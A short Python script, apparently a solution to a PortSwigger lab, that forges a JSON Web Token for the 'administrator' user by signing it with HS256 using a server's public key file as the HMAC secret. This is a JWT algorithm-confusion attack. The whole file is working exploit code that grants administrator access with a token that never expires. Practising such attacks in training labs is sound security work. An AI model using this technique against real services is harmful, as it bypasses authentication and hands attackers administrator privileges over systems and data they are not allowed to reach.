import hmac
import hashlib
import base64
import json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

with open("16ea043a4514d4fd_65537_x509.pem", "rb") as f:
    secret = f.read()

header = {
    "kid": "87cba841-1b7f-4fdf-8faf-9c351b2694e6",
    "alg": "HS256"
}

payload = {
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 9999999999
}

header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())

signing_input = f"{header_b64}.{payload_b64}".encode()

signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
signature_b64 = b64url(signature)

token = f"{header_b64}.{payload_b64}.{signature_b64}"
print(token)
